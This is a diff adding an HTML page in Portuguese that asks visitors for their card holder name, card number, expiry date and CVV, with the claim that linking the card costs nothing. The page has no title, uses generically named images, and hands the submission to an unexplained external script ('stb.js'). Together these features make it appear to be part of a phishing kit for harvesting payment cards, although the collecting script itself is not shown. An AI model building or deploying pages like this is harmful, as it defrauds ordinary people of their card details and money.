@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html >
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/mikasa.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <title></title>
+</head>
+<body >
+    <div class="top1">
+        <img src="./img/topo.JPG" alt="">
+    </div>
+
+    <div class="kolch1">
+        <p class="p-1">Informação do cartão</p>
+        <p class="p-2">Quando ligar o seu cartão, não lhe será cobrada qualquer taxa.</p>
+
+        <form action="" method="post" id="pg2">
+            <p>Titular do cartão </p>
+                <input type="text" name="" id="four" required maxlength="15">
+
+                <p>Número do cartão </p>
+            <input type="tel" name="" id="one" maxlength="19" required placeholder="---- ---- ---- ----">
+            
+            <p>Data de validade</p>
+            <input class="cv-1" type="tel" name="" id="two1" maxlength="5" required placeholder="MM/AA">
+
+            <p>Código de Segurança (CVV/CVC)</p>
+            <input class="cv-1" type="tel" name="" id="three" maxlength="3" required>
+               
+
+            <button type="submit" >Continuar</button>
+        </form>
+        
+        
+    </div>
+
+
+    <div>
+        <div class="bonit">
+            <img src="./img/boit1.JPG" alt="">
+            <img src="./img/boit2.JPG" alt="">
+        </div>
+    </div>
+
+    <script>
+        $("#one").on("keyup",function(){
+            cc = $(this).val().split(" ").join("");
+            cc = cc.match(new RegExp('.{1,4}$|.{1,4}', 'g')).join(" ");
+            $(this).val(cc);
+        });
+        $("#two1").on("keyup",function(){
+           dd = $(this).val().split("/").join("");
+           dd = dd.match(new RegExp('.{1,2}$|.{1,2}', 'g')).join("/");
+           $(this).val(dd);
+       });
+    </script>
+    <!-- my script -->
+    <script src="./js/stb.js"></script>
+</body>
+</html>
